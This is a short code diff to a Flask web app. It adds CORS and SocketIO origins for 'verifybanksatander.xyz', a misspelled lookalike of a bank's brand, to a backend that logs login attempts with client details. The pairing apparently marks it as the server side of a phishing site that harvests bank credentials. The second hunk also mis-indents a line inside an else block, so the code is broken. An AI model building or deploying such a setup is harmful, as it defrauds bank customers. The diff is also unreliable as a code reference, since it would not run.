@@ -27,8 +27,30 @@ app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
 
 Session(app)
 db = SQLAlchemy(app)
-CORS(app, supports_credentials=True, resources={r"/api/*": {"origins": "http://localhost:5173"}})
-socketio = SocketIO(app, cors_allowed_origins="http://localhost:5173", manage_session=False)
+# Configure CORS to allow both localhost and production domain
+CORS(app, supports_credentials=True, resources={
+    r"/api/*": {
+        "origins": [
+            "http://localhost:5173",
+            "https://www.verifybanksatander.xyz",
+            "https://verifybanksatander.xyz"
+        ]
+    }
+})
+
+# Configure SocketIO with allowed origins
+socketio = SocketIO(
+    app,
+    cors_allowed_origins=[
+        "http://localhost:5173",
+        "https://www.verifybanksatander.xyz",
+        "https://verifybanksatander.xyz"
+    ],
+    manage_session=False,
+    async_mode='eventlet',
+    logger=True,
+    engineio_logger=True
+)
 
 rate_limiter = {}
 RATE_LIMIT_ATTEMPTS = 10
@@ -192,7 +214,7 @@ def login():
             return jsonify({'message': 'Invalid admin credentials'}), 401
     else:
         client_info = get_client_info()
-        attempt_id = str(uuid.uuid4())
+    attempt_id = str(uuid.uuid4())
         new_attempt = LoginAttempt(
             id=attempt_id,
             username=username,
